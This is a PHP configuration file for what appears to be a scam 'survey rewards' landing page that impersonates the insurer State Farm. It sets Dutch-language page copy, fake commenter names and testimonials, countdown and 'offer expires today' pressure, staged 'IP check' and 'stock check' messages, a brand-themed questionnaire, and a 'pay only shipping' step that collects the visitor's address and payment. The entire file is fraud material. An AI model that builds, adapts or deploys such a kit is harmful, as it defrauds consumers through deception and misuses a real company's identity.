<?php

// product
$product = "aaaa";
$description = "wwww";
$price = "2";
$productImage = "/templates/products/haricprod.png";
$commentImage1 = "/templates/products/haricomm2.jpeg";
$commentImage2 = "/templates/products/download.jpg";
$wallID = "1";

// brand
$name = "State Farm";
$brandLogo = "/templates/brands/4gsgzoddk6k.png";
$favicon = "/templates/brands/7dkgpk208br.ico";
$backgroundImage = "/templates/brands/vpak3a1g49l.png";
$mainColor = "rgb(237,29,36)";
$secondaryColor = "rgb(34,34,34)";
$headerColor = "rgb(237,29,36)";

// geo
$geo = "ch";
$langTag = "nl";
$currency = "$";
$commentName1 = "Mia Fischer";
$commentName2 = "Luca Müller";
$commentName3 = "Sofia Hofmann";
$commentName4 = "Leon Keller";
$commentName5 = "Laura Lang";
$profilePic1 = "/templates/geos/1_ch.jpg";
$profilePic2 = "/templates/geos/2_ch.jpg";
$profilePic3 = "/templates/geos/3_ch.jpg";
$profilePic4 = "/templates/geos/4_ch.jpg";
$profilePic5 = "/templates/geos/5_ch.jpg";
$flagLogo = "/templates/geos/flaglogo_ch.png";

// texts
$title = "Enquêtebeloningen";
$text1 = "";
$text2 = "Enquête over";
$text3 = "";
$text4 = "We willen je graag een unieke kans bieden om een gloednieuwe";
$text5 = "Om te claimen, beantwoord deze korte enquête over je ervaring met";
$text6 = "Let op!";
$text7 = "Deze enquête-aanbieding vervalt vandaag,";
$text8 = "ENQUÊTE STARTEN";
$text9 = "Even wachten terwijl we je antwoorden verwerken...";
$text10 = "Antwoorden indienen...";
$text11 = "Controle op dubbele IP-adressen...";
$text12 = "Controleren van onze voorraad voor producten...";
$text13 = "Gefeliciteerd...";
$text14 = "Antwoorden ingediend";
$text15 = "IP-adres gecontroleerd";
$text16 = "Producten beschikbaar op voorraad";
$text17 = "Bedankt voor het invullen van de enquête!";
$text18 = "Omdat je zeer waardevolle consumenten gegevens hebt verstrekt, kun je nu enkele van de volgende exclusieve beloningen kiezen.";
$text19 = "Let op: als je deze pagina verlaat zonder je beloning op te eisen, hebben we geen andere keuze dan een andere bezoeker de kans te geven deel te nemen aan ons beloningsprogramma.";
$text20 = "Prijs:";
$text21 = "Nog op voorraad:";
$text22 = "Betaal alleen verzendkosten!";
$text23 = "BELONING OPEISEN";
$text24 = "Nieuw Commentaar";
$text25 = "Reacties (5)";
$text26 = "Indienen";
$text27 = "Ik heb dit net via e-mail ontvangen en heb het geprobeerd. Ik ben enthousiast om mijn beloning te krijgen! Kan ik de enquête ook naar mijn vrienden sturen?";
$text28 = "Ik heb echt een prijs gewonnen met deze enquête! Ik was aanvankelijk sceptisch, maar heb het geprobeerd. En kijk wat er net per post is aangekomen!";
$text29 = "Lol, zo&#x27;n coole enquête, maar jammer dat ik geen prijs heb gekregen..";
$text30 = "Ik doe meestal niet aan dit soort online enquêtes, maar dit is echt een goede! We zullen deze prijs goed gebruiken, dankjewel!";
$text31 = "Waar kan ik meer enquêtes zoals deze vinden? Ik vind het leuk om prijzen te krijgen :)";
$text32 = "";
$text33 = "*Voor producten die op de laatste pagina worden aangeboden, zijn verzend- en administratiekosten van toepassing. Zie de website van de fabrikant voor details, aangezien de voorwaarden per aanbieding verschillen. Zie belangrijke algemene voorwaarden met betrekking tot deze enquête, de website en de advertentie.";
$text34 = "*Let op: Verzendkosten kunnen van toepassing zijn.";
$text35 = "Aanbieding verloopt over";
$text36 = "Gefeliciteerd!";
$text37 = "We hebben (1) gereserveerd";
$text38 = "speciaal voor jou.";
$text39 = "Hoe je je";
$text40 = "Vul je verzendadres in.";
$text41 = "Betaal alleen de verzendkosten om je prijs te ontvangen.";
$text42 = "Je prijs wordt binnen 5-7 werkdagen geleverd.";
$text43 = "Doorgaan";
$like = "Vind ik leuk";
$reply = "Reageer";
$montharray = "januari, februari, maart, april, mei, juni, juli, augustus, september, oktober, november, december";

$survey = array(
    array("Hoe vaak bezoek je een State Farm locatie voor je verzekeringsbehoeften?", "Meerdere keren per week", "Eenmaal per week", "Een paar keer per maand", "Zelden of nooit"),
    array("Wat is de belangrijkste drijfveer voor je keuze om bij State Farm te kopen?", "Handige locatie", "Productselectie", "Prijzen en aanbiedingen", "Loyaliteitsbelonings programma"),
    array("Hoe reageer je typisch op advertenties van State Farm?", "Ik zoek naar items die ik nodig heb", "Ik blader als er een goede deal is", "Ik overweeg een bezoek als er een promotie is", "Ik negeer de advertenties meestal"),
    array("Als je een prijs van State Farm hebt gewonnen, hoe zou dit je kijk op State Farm veranderen?", "Significante positiever", "Iets positiever", "Geen verandering", "Meer negatief"),
    array("Wat is het meest aantrekkelijke kenmerk van de prijs voor jou?", "Duurzaamheid", "Koelingsefficiëntie", "Draagbaarheid", "Ontwerp en uiterlijk"),
    array("Hoe waarschijnlijk ben je om de prijs te gebruiken als je er een van State Farm ontvangt?", "Zeer waarschijnlijk", "Iets waarschijnlijk", "Onwaarschijnlijk", "Ik zou het niet gebruiken"),
    array("In termen van verzekeringsproducten, hoe goed denk je dat State Farm aan je behoeften voldoet?", "Overtreft mijn behoeften", "Voldoet goed aan mijn behoeften", "Voldoet voldoende aan mijn behoeften", "Voldoet niet aan mijn behoeften"),
    array("Hoe waarschijnlijk ben je om deel te nemen aan toekomstige promoties of enquêtes van State Farm?", "Zeer waarschijnlijk", "Iets waarschijnlijk", "Niet erg waarschijnlijk", "Niet al te waarschijnlijk"),
);

?>